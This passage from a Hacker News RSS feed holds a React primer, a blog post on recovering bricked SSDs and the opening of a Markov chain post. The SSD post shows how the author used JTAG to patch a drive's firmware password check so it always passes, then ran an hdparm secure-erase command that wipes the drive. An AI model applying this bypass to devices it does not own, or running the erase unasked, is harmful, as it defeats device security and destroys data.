0-112.558-50.395-112.558-112.559 0-62.164 50.394-112.559 112.558-112.559 62.164 0 112.555 50.395 112.555 112.559zm0 0"></path><path fill="#40404c" d="M199.75 295.457c0 43.957-35.637 79.59-79.59 79.59-43.957 0-79.594-35.633-79.594-79.59s35.637-79.59 79.594-79.59c43.953 0 79.59 35.633 79.59 79.59zm0 0"></path><path fill="#589ce0" d="M197.809 277.918c-7.985 35.52-39.715 62.062-77.641 62.062-37.922 0-69.664-26.542-77.648-62.062 7.984-35.52 39.714-62.055 77.64-62.055 37.934 0 69.664 26.535 77.649 62.055zm0 0"></path><path fill="#357fbc" d="M89.21 295.46c0 15.548 4.45 30.04 12.165 42.29-29.281-7.094-52.234-30.371-58.863-59.832 7.988-35.52 39.718-62.055 77.64-62.055a79.306 79.306 0 0124.325 3.793C112.422 229.93 89.21 259.98 89.21 295.461zm0 0M360.89 295.46c0 15.548 4.45 30.04 12.165 42.29-29.282-7.094-52.235-30.371-58.864-59.832 7.989-35.52 39.72-62.055 77.641-62.055 8.484 0 16.66 1.328 24.324 3.793-32.054 10.274-55.265 40.324-55.265 75.805zm0 0"></path><path d="M120.16 208.266c-48.078 0-87.191 39.113-87.191 87.191s39.113 87.191 87.191 87.191c48.074 0 87.188-39.113 87.188-87.191s-39.114-87.191-87.188-87.191zm0 15.203c33.645 0 61.961 23.203 69.817 54.445-3.766 15.024-12.426 28.625-24.551 38.45-12.75 10.327-28.824 16.015-45.262 16.015-16.441 0-32.516-5.688-45.27-16.016-12.124-9.824-20.789-23.425-24.554-38.449 7.855-31.242 36.172-54.445 69.82-54.445zm0 143.976c-33.863 0-62.32-23.504-69.96-55.05a87.387 87.387 0 0015.128 15.78c15.45 12.516 34.922 19.407 54.836 19.407 19.91 0 39.383-6.89 54.832-19.406a87.712 87.712 0 0015.121-15.778c-7.644 31.543-36.097 55.047-69.957 55.047zm0 0"></path><path d="M504.188 252.852a225.242 225.242 0 00-2.055-5.059l-64.762-157c-7.98-19.344-22.355-34.59-40.105-43.727l-6.09-14.77A52.095 52.095 0 00371.94 8.81 52.135 52.135 0 00342.911 0c-28.79 0-52.212 23.422-52.212 52.21v17.528c-11.883 14.766-19.02 33.504-19.02 53.887v5.8h-31.363v-5.8c0-20.383-7.136-39.121-19.02-53.887V52.211C221.297 23.42 197.876 0 169.087 0c-10.36 0-20.399 3.047-29.04 8.816a52.092 52.092 0 00-19.226 23.48l-6.09 14.77C96.984 56.203 82.605 71.45 74.63 90.793l-16.625 40.3a7.6 7.6 0 004.129 9.927 7.593 7.593 0 009.922-4.13l16.625-40.3c10.992-26.645 36.718-43.86 65.539-43.86 39.09 0 70.894 31.801 70.894 70.895V237.02c-20.566-36.79-59.902-61.723-104.957-61.723-28.219 0-54.191 9.785-74.719 26.129l16.407-39.774c1.601-3.879-.25-8.324-4.13-9.925-3.878-1.602-8.323.25-9.925 4.128L9.867 247.79c-.594 1.367-2.215 5.414-2.289 5.672C2.684 266.539 0 280.69 0 295.457c0 66.254 53.902 120.156 120.16 120.156 66.254 0 120.156-53.902 120.156-120.156v-4.89h31.368v4.89c0 66.254 53.902 120.156 120.156 120.156 66.258 0 120.16-53.902 120.16-120.156 0-14.996-2.77-29.355-7.813-42.605zM154.217 37.527c-6.874 0-13.6.82-20.081 2.36l.738-1.793a36.915 36.915 0 0113.621-16.64 36.969 36.969 0 0120.59-6.255c20.406 0 37.012 16.606 37.012 37.012v2.754c-14.438-10.934-32.41-17.438-51.88-17.438zM342.915 15.2c7.344 0 14.461 2.164 20.578 6.246a36.926 36.926 0 0113.633 16.649l.738 1.793a86.64 86.64 0 00-20.086-2.36c-19.465 0-37.437 6.504-51.875 17.438V52.21c0-20.406 16.602-37.012 37.012-37.012zm-56.027 108.426c0-39.094 31.8-70.895 70.894-70.895 28.82 0 54.547 17.215 65.535 43.86l43.247 104.836c-20.528-16.344-46.504-26.13-74.723-26.13-45.055 0-84.39 24.934-104.953 61.72zm-15.203 21.004v72.969h-31.368v-72.97zM120.16 400.414c-57.875 0-104.957-47.082-104.957-104.957S62.285 190.5 120.16 190.5c57.871 0 104.953 47.082 104.953 104.957S178.031 400.414 120.16 400.414zm120.156-125.05v-42.567h31.368v42.566zm151.524 125.05c-57.871 0-104.953-47.082-104.953-104.957S333.969 190.5 391.84 190.5c57.875 0 104.957 47.082 104.957 104.957S449.715 400.414 391.84 400.414zm0 0"></path><path d="M450.883 241.547c-3.356 2.523-4.024 7.289-1.5 10.644 5.844 7.758 9.976 16.438 12.289 25.66-3.758 15.047-12.426 28.676-24.57 38.512-12.747 10.328-28.82 16.016-45.262 16.016-16.438 0-32.516-5.688-45.266-16.016-12.125-9.82-20.789-23.422-24.554-38.441 7.851-31.246 36.171-54.453 69.82-54.453 14.426 0 28.344 4.25 40.242 12.289a7.599 7.599 0 0010.555-2.043 7.6 7.6 0 00-2.043-10.555c-14.422-9.742-31.282-14.894-48.754-14.894-48.078 0-87.192 39.113-87.192 87.191s39.114 87.191 87.192 87.191 87.191-39.113 87.191-87.191c0-19.082-6.054-37.207-17.508-52.41-2.52-3.356-7.285-4.027-10.64-1.5zM391.84 367.445c-33.856 0-62.313-23.5-69.953-55.043a87.422 87.422 0 0015.12 15.774c15.45 12.515 34.923 19.406 54.837 19.406 19.91 0 39.383-6.89 54.832-19.406A87.382 87.382 0 00461.8 312.39c-7.64 31.55-36.098 55.054-69.961 55.054zm0 0"></path></svg> . You'll not only see the <strong>big picture</strong> of what makes React special, but also zoom in to get some <strong>hands-on experience</strong> of writing an actual React component. And yes, no JS knowledge required!</p><p>Remember: You don't need to be an experienced developer to understand the core ideas of React!</p><p>Ready to start the journey?</p><div><p>Of course, eventually you'd need to write code to use React. That's why I'm building an email course to help you on that.</p><p>I believe you'd be able to do useful work with React after a few days of learning, <strong>even if you are new to coding</strong>. If you are interested, sign up and I'll let you know when the course is ready!</p></div><h2><a id="a-few-things-about-the-web" href="#a-few-things-about-the-web"><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" height="20" width="20" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>A few things about the Web</a></h2><p>Let's get started with something you might have heard many times, the DOM.</p><h3><a id="what-is-the-dom" href="#what-is-the-dom"><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" height="20" width="20" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>What is the DOM?</a></h3><p>When you enter the address of your favorite website into a browser, your computer starts a conversation with another computer far away, commonly referred to as <em>server</em>. Typically your computer makes a request for some information and the server responds:</p><blockquote><p><strong>Your computer:</strong> Yo, what's good about this random site learnreact.design?</p><p><strong>The server:</strong> Hang on, let me grab something for you. Beep. Boop.</p></blockquote><p>The main part of the server's response usually includes three items: HTML, CSS and JavaScript.</p><p>HTML lists the content of a web page and describes its structure. How many headings and paragraphs are there? What images should a user see? Are this button and that textbox contained in the same box?</p><p>Using this information, the browser creates something called... the DOM!</p><div><p><img alt="Introducing the DOM" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async"></p></div><p>Wait a second, the DOM is a ... tree? Yup, a tree! Oddly enough, a lot of things in our computer look like a tree. Let's give our tree friend a nickname... hmm what about Domo?</p><p>Domo works as a model at the prestigious art studio "Web Browser". His job is to pose in front of the artist who paints a portrait (or perhaps millions of portraits).</p><div><p><img alt="Domo at the art studio Web Browser" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async"></p></div><p>In real life, DOM stands for Document Object Model. It's indeed a model -- a model of the document (aka the web page). It strikes a pose. The browser paints a portrait. The portraits are what we see on a web page: the textboxes, the paragraphs, the images and so on. A developer's job is like that of a director who tells Domo what to wear and what pose to strike. This determines what those portraits look like in the end.</p><p>To check out what the DOM looks like, if you are using a desktop browser, right-click on this very page and choose "Inspect". Can you make sense of what's in the Elements tab?</p><div><p><img alt="Inspect in Chrome" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async"></p></div><h3><a id="the-dom-api" href="#the-dom-api"><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" height="20" width="20" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>The DOM API</a></h3><p>We often want a web page to be dynamic and interactive -- that means its content changes from time to time: adding or removing text here and there, showing a modal, or updating a chart based on some new data coming from the server.</p><p>Remember, in order to change what's on a web page, we need to update the DOM. The artist isn't able to paint new portraits until Domo changes to a new pose.</p><p>How would we get Domo to change to a new pose?</p><p>We just talk to him. He listens. Interestingly, Domo's ears happen to have a name: <em>DOM API</em>.</p><div><p><img alt="A developer works with DOM API" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async"></p></div><p>To manipulate the DOM, a developer would write code in JavaScript which talks to the DOM API, and in turn, updates the content of the web page.</p><h3><a id="the-increasing-complexity" href="#the-increasing-complexity"><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" height="20" width="20" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>The increasing complexity</a></h3><p><em>Directly</em> talking to Domo has been the standard approach of web development for years, especially when the web content was mostly static. A developer would sprinkle some interactivity on top of the static pages by writing small amount of JavaScript code.</p><p>However, with the emergence of SPAs (Single Page Application) such as Gmail and Google Maps, people started to expect a lot more. Instead of mostly static web <em>pages</em>, they want web <em>apps</em> that are interactive, fast and responsive.</p><p>The code required to build web apps becomes increasingly large and complex. It often requires the collaboration of many team members.</p><p>The traditional approach stopped working. It becomes chaotic and inefficient to always directly talk to Domo.</p><div><p><img alt="Directly working with the DOM API is getting chaotic" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async"></p></div><h2><a id="the-core-ideas-of-react" href="#the-core-ideas-of-react"><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" height="20" width="20" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>The Core Ideas of React</a></h2><p>Let me introduce you to the superhero, React:</p><div><p><img alt="Introducing React" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async"></p></div><p>With React, developers no longer directly talk to Domo. React acts as an agent between a developer and Domo. He smoothens the communication and streamlines the process of portrait creation.</p><div><p><img alt="React as an agent between a developer and the DOM" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async"></p></div><p>React is made up of JavaScript code. It's built in a way that we no longer need to directly work with the DOM API in most cases. Instead, we write simpler code while React handles the conversation with the DOM under the hood.</p><p>React has a few superpowers to tackle the ever-growing complexity of web development:</p><ul><li>Components</li><li>Declarative UI</li><li>Reactive DOM updates</li></ul><p>If these terms sound scary to you, don't be intimidated! As promised, I'll use plain English and doodles to help you make sense of them. Trust me, it's not that hard!</p><p>Just read on!</p><h3><a id="components" href="#components"><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" height="20" width="20" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>Components</a></h3><p>Components are the flagship feature of React. The core idea is based on a simple strategy: divide-and-conquer. If it's difficult to grok a problem all at once, we break it into smaller problems, solve them one at a time and then combine the results.</p><div><p><img alt="React breaks a problem into components" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async"></p></div><p>Building an app in React is almost all about working with components: breaking the app into components, finding the best components for the job, fitting one with another, creating new components from existing ones etc.</p><p>Nowadays, design tools such as Framer and Figma have components too (and symbols in Sketch). They are a lot like React components, except that the latter are more flexible and powerful. In fact, the inspiration of components in design tools came directly from components in software engineering. Once a component is created, we can create multiple instances of it. We can use it to construct other components. If we change a component, everything that includes this component will be updated automatically.</p><p>Components in React have two important properties:</p><ol><li>Components are <em>composable</em>. They are made for reuse. We can make a new component with other components.</li><li>Components are <em>independent</em> of each other. If we change the code in one place, other parts don't break.</li></ol><p>If this sounds abstract to you, don't worry! I'll show you some examples and explain these properties in details soon.</p><h3><a id="declarative-ui" href="#declarative-ui"><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" height="20" width="20" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>Declarative UI</a></h3><h4><a id="imperative-vs-declarative" href="#imperative-vs-declarative"><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" height="20" width="20" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>Imperative vs. declarative</a></h4><p>When directly working with the DOM API, we'd have to specify what element to change at the right time, in the right order. This is equivalent to describing to Domo how to position his head, arms and legs step by step, for each and every portrait.</p><div><p><img alt="Imperative programming" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async"></p></div><p>Heck, this sounds tedious and error-prone! Why can't we just tell Domo <em>what</em> we want instead of <em>how</em> to pose? In fact, this is exactly how to build a UI in React. A developer draws a quick sketch of what he or she wants. React explains it to Domo how to pose.</p><div><p><img alt="Declarative programming in React" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async"></p></div><p>Because the apps we build are dynamic, we often want Domo to change poses fairly quickly. We draw many sketches and hand them to React in a big pile. React stacks these sketches together and flips them like a flipbook. A dynamic UI comes live!</p><div><p><img alt="React treats input as a flipbook" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async"></p></div><p>In tech terms, if the code defines <em>how</em> we want it to be done, it's <strong>imperative</strong>; if it defines <em>what</em> we want, it's <strong>declarative</strong>. The traditional way of directly working with the DOM API is imperative, and the React way is declarative.</p><p>Imperative programming emerged from the day when the computers were primitive. People had to instruct them in detail: where to store the numbers, how to multiply etc. But this eventually got unmanageable, people wrote smart software that convert definition of problems into detailed instructions. Declarative programming was born.</p><h4><a id="virtual-dom" href="#virtual-dom"><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" height="20" width="20" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>Virtual DOM</a></h4><p>Besides making the life of a developer easier, declarative programming in React also offers opportunities for performance optimization.</p><p>When React has all the sketches beforehand, he can sort through them, remove any duplication and make sure that Domo and the artist do as little work as possible.</p><div><p><img alt="React diffing with virtual DOM" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async"></p></div><p>These sketches are called <em>Virtual DOM</em>. Virtual DOM is much faster to manipulate than the DOM. Developers work with Virtual DOM most of the time instead of directly managing the DOM. React handles the dirty work of managing the slow DOM.</p><h3><a id="reactive-dom-updates" href="#reactive-dom-updates"><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" height="20" width="20" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>Reactive DOM updates</a></h3><p>Even cooler, imagine if we can leave placeholders in our sketches to represent different variations of a same pose. This way, when somebody asks for portraits of Domo wearing a different hat, we don't have to talk to React again. We can just sit back and let React change it for us.</p><div><p><img alt="Thinker with a hat: Placeholder in JSX" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async"></p></div><p>This trick is how React got its name. The UI built with React is <strong>reactive</strong> -- it appears that the DOM "reacts" to any changes to the underlying data. No need to track the data. No need to worry about when to update the DOM. It just gets updated automatically (by React). The idea of reactive UI greatly simplifies UI development.</p><div><div><p>Now let's review what we have learned so far and get our hands dirty on a few real React components. To make it easy for you to understand, I left out some details in the code (notedly JavaScript). The goal is to let the core ideas shine through without being bogged down by JS syntax. If you are comfortable with reading JavaScript code, feel free to check out the <a href="https://codesandbox.io/s/domos-hat-shop-4x7n0?file=/src/App.js" target="_blank" rel="nofollow noopener noreferrer">real source code</a>.</p><p>Alright. Let's say we want to help Domo build an online hat store 🧢 .</p><h3><a id="components-are-composable" href="#components-are-composable"><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" height="20" width="20" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>Components are composable</a></h3><p>We can break the UI into a few parts:</p><ul><li>Header: the header on the top</li><li>Main: the main content area</li><li>Footer: the footer on …</li></ul></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://learnreact.design/posts/what-is-react">https://learnreact.design/posts/what-is-react</a></em></p>]]>
            </description>
            <link>https://learnreact.design/posts/what-is-react</link>
            <guid isPermaLink="false">hacker-news-small-sites-26003666</guid>
            <pubDate>Tue, 02 Feb 2021 17:16:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Recovering a Bricked SSD with JTAG and a Raspberry Pi]]>
            </title>
            <description>
<![CDATA[
Score 45 | Comments 4 (<a href="https://news.ycombinator.com/item?id=26003176">thread link</a>) | @fanf2
<br/>
February 2, 2021 | https://fmad.io/blog-ssd-bricked-restore.html | <a href="https://web.archive.org/web/*/https://fmad.io/blog-ssd-bricked-restore.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

			<p>
				SSD`s are the life blood of our fmadio 10G, 40G, 100G ethernet capture systems. They provide backing storage that well exceeds that of conventional RAM, are super fast and light weight. Thus its prudent to keep the SSD farms in top nick, optimal health, and occasionally perform emergency room brain surgery on them. Unfortunately today is one of those days.
			</p>
			<br>

			<div>                        
				<ul>                            
					<li><img width="60%" src="https://fmad.io/images/blog/20141229_ssd_jtag_close.jpg" alt="ssd connected to jtag"></li>
				</ul>                        
			</div>


		<p>
As with all things, it happened late on a Friday night when I was adding a new feature to the system that wipes all capture data from the system. This is simple button click on the web UI page as our clients data is quite sensitive thus needs to be deleted when the box moves internally or externally. The wipe is implemented using the "Secure Erase" ATA-8 command, you can read all about it <a href="https://ata.wiki.kernel.org/index.php/ATA_Secure_Erase">here</a>. Its essentially a restore-to-factory-setting operation. Meaning after the SecureErase the drive`s internal state is the same as "just left the factory". 
		</p>
		
		<p>
Which is great when it works, but this kind of low level drive formatting is pretty complicated with many (presumably) asynchronous operations going on in parallel... and doing 100 of these operations back to back at high speed is probably something the vendor did not expect (I was testing dammit!). In our case this bricked 6 SSD`s rendering them completely useless causing myself quite the stress as I now have several thousand dollars worth of inventory destroyed!  - not a good day.
</p>


				<p><img width="1024px" src="https://fmad.io/images/blog/money_burn.jpg" alt="fmadio ssd lost"></p><p>
The result is a wall of rather intimidating errors indicating imminent doom with the disk is for all intensive purposes <a href="https://en.wikipedia.org/wiki/Brick_%28electronics%29"><b>BRICKED</b></a>.

<code>

kernel: [18633.754193] ata2.00: exception Emask 0x0 SAct 0x0 SErr 0x0 action 0x0
kernel: [18633.754204] ata2.00: irq_stat 0x40000001
kernel: [18633.754206] ata2.00: failed command: READ DMA
kernel: [18633.754209] ata2.00: cmd c8/00:08:00:00:00/00:00:00:00:00/e0 tag 0 dma 4096 in
kernel: [18633.754209]          res 51/04:00:00:00:00/00:00:00:00:00/60 Emask 0x1 (device error)
kernel: [18633.754210] ata2.00: status: { DRDY ERR }
kernel: [18633.754211] ata2.00: error: { ABRT }
kernel: [18633.754515] ata2.00: supports DRM functions and may not be fully accessible
kernel: [18633.754614] ata2.00: failed to get NCQ Send/Recv Log Emask 0x1
kernel: [18633.759150] ata2.00: supports DRM functions and may not be fully accessible
kernel: [18633.759215] ata2.00: failed to get NCQ Send/Recv Log Emask 0x1
kernel: [18633.763495] ata2.00: configured for UDMA/133
kernel: [18633.770136] ata2: EH complete
kernel: [18633.770278] ata2.00: exception Emask 0x0 SAct 0x0 SErr 0x0 action 0x0
kernel: [18633.770280] ata2.00: irq_stat 0x40000001
kernel: [18633.770281] ata2.00: failed command: READ DMA
kernel: [18633.770284] ata2.00: cmd c8/00:08:00:00:00/00:00:00:00:00/e0 tag 1 dma 4096 in
kernel: [18633.770284]          res 51/04:00:00:00:00/00:00:00:00:00/60 Emask 0x1 (device error)
kernel: [18633.770286] ata2.00: status: { DRDY ERR }
kernel: [18633.770286] ata2.00: error: { ABRT }
kernel: [18633.770572] ata2.00: supports DRM functions and may not be fully accessible
kernel: [18633.770641] ata2.00: failed to get NCQ Send/Recv Log Emask 0x1
kernel: [18633.775164] ata2.00: supports DRM functions and may not be fully accessible
kernel: [18633.775210] ata2.00: failed to get NCQ Send/Recv Log Emask 0x1
kernel: [18633.779527] ata2.00: configured for UDMA/133
kernel: [18633.786094] ata2: EH complete
kernel: [18633.786205] ata2.00: exception Emask 0x0 SAct 0x0 SErr 0x0 action 0x0
kernel: [18633.786207] ata2.00: irq_stat 0x40000001
kernel: [18633.786208] ata2.00: failed command: READ DMA
</code>


</p><p>
The usual suspects to recover were tried and failed, leaving only a few options.
<br>
</p>

<h5>a) RMA the boards back to the seller<br>
b) Contact vendor support<br>
c) Perform surgery</h5>


<p>
Option a) of RMA`ing the boards was the safest option, tho usually you get some other previously recycled RMA`ed device back. Option b) of contacting the vendor is always such a brutally painful experience. It would likely end up with some random "Customer Support" person with a strange accent... giving the default completely useless response of RMA the device and get a replacement kind of thing... ho hum. Which leaves surgery! Now I usually don't go messing with hardware like this (anymore... :) ) because it takes up quite a bit time. However SSD health and prosperity is directly linked to our profitability thus deemed it a worth while time investment to have a more intimate relationship with our SSD models of choice. 
</p>
<br>

<div><p>
The process starts with a general reconnaissance mission of what pins are accessible, and what those pins are for. First up was finding the UART / serial interface but it was silent and likely disabled by the firmware. Next up was what most likely looked like a JTAG interface and... bingo, full JTAG interface connecting and operating as expected.
</p><p>

 JTAG is a hardware based system debugger that for CPU`s let you control instruction execution and read/write memory anywhere. You can see in the picture below some soldering of header pins was required, that is then wired to a breadboard which is wired to a Raspberry PI.
</p></div>


	<p><img width="1024px" src="https://fmad.io/images/blog/20141229_ssd_jtag.jpg" alt="fmadio ssd with jtag connected"></p><div><p>
Raspberry PI? wtf ? In this case the Raspberry PI was converted into a JTAG debugger using the outstanding software over at <a href="http://openocd.sourceforge.net/">OpenOCD</a>. As "real" JTAG debuggers are quite expensive ranging from $100 - $1000+ making OCD coupled with the PI an excellent low cost alternative. 
</p><p>

At this point you get a small rush as you gain access and poke the device, after which the vastness of having no idea what anything does starts to weigh you down. Then slowly bit by bit, instruction after instruction, string after string you gain some intuition on the memory map, what the code does, how its setup and eventually find something interesting.
</p></div> 

<p>

The first entry point to look for is the classic printf / trace / debug operation which gives you insight into what the software is doing. And eventually managed to track down the code that`s basically

<code>
void trace(char* Message, ...)
{ 
	va_arg list;
	va_start(arglist, Message);

	char buf[1024];
	vsprintf(buf, Message, arglist);

	if (debug_enable)
	{
		fwrite(output, buf, strlen(buf));
	}
}
</code>

which writes out a string to a console to tell the developer on whats going on. Note that the code has to "flatten" the string first before even deciding to output or not, which gives us a nice window to sniff the string with JTAG even if nothing is written to the console. 
</p>


<p>
After sniffing strings for a while and getting a better feel for whats happening noticed that the SSD is receiving commands from the SATA host no problem. But there`s some sort of funkyness going on that causes the SSD to send no response back - kind of a one-way-street. One idea to resolve this is: in theory the security erase operation restores everything back to good health. The question tho, is the device actually processing a security erase request ?  
</p>


<p>
... and using our printf JTAG sniffer... it most certainly is processing the request! But failing miserably due to an incorrect password. You can see the sniffed printf jtag string in the output below. Hint: <i>"&lt;SED&gt; Credential Comparison Failed"</i> ASCIIZ string.
</p>


	<p><img width="1024px" src="https://fmad.io/images/blog/20141229_ssd_security_erase_fail.jpg" alt="fmadio ssd security erase fail"></p><p>
Which makes it clear why the security erase / factory reset failed but more importantly you can track down the offending bit of code from this string. That results in the following snippet of assembler courtesy of the IDA toolset below.
</p> 

<p><img width="1024px" src="https://fmad.io/images/blog/20141229_ssd_security_check.jpg" alt="fmadio ssd security erase password check"></p><p>
To decode that for you its doing a 32 byte long compare against some expected cryptographic hash key. Then the <i>"magic compare"</i> aka instruction <b>CMP R5, #1</b> is testing if the keys matched. Then doing a conditional jump to a printf routine based on that comparison result <b>BLNE sub_80...</b>. And finally  the functions return value is the result of the comparison <b>MOV R0, R5</b>. Nothing particularly fancy going on.
</p> 


<p>
There`s a few ways to go from here. One would be to reverse engineer how the 32B key is generated and create  a general purpose exploit. The other would be to just patch the binary such that it thinks it passed the security check. eg Fake a correct password response. We chose the latter as it only takes a few minutes and all I want is to restore the SSD farm`s health. Patching the binary with JTAG is trivial, console output is shown below.
</p> 


<p><img width="1024px" src="https://fmad.io/images/blog/20141229_ssd_security_erase_patch.jpg" alt="fmadio ssd security erase password fake"></p><div><p>
The above shows disassembling the patched code first, the "before" section. This is to check we overwrite the correct bit of code. Then patch it using the command <b>cpu0 arm mww</b> with the value 0xe3a05001. Then disassemble again "after section" to confirm the patch worked and has the correct instruction. 
</p><p>

In this case we replaced <b>BLNE</b> instruction (print error message to the console) with <b>MOV r5, #1</b> at address 0x8009abe4 (shown in blue). The result of the "magic check" is 0 for fail, 1 for pass and write it to register r5. All we did is ignore the whole comparison and simply override it and say the security check always passes (r5 = 1).
</p></div> 

<p>
...
</p>

<p>
Now its patched, with cpu`s resumed its the moment of truth. Issuing the security erase operation from the host system via hdparm. 
<br>
<code>
$ sudo hdparm --security-erase 1234  /dev/sdb
security_password="1234"

/dev/sdb:
 Issuing SECURITY_ERASE command, password="1234, user=user
$
</code>
<br>
... and it worked! the SSD is back to life, working as normal and running at high speed!  ... with <b>several thousand dollars worth of SSD`s back in business</b> making our 10G, 40G, 100G network capture systems more resilient than ever. Now if the SSD vendor (who shall remain nameless) would fix the dam bug so excessive back-to-back security password/erase does NOT brick the device, life would be so much better. 
</p>


	</div></div>]]>
            </description>
            <link>https://fmad.io/blog-ssd-bricked-restore.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26003176</guid>
            <pubDate>Tue, 02 Feb 2021 16:43:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Generating Text with Markov Chains]]>
            </title>
            <description>
<![CDATA[
Score 66 | Comments 21 (<a href="https://news.ycombinator.com/item?id=26002911">thread link</a>) | @healeycodes
<br/>
February 2, 2021 | https://healeycodes.com/generating-text-with-markov-chains/ | <a href="https://web.archive.org/web/*/https://healeycodes.com/generating-text-with-markov-chains/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>I wanted to write a program that I could feed a bunch of novels and then produce similar text to the author’s writing.</p>
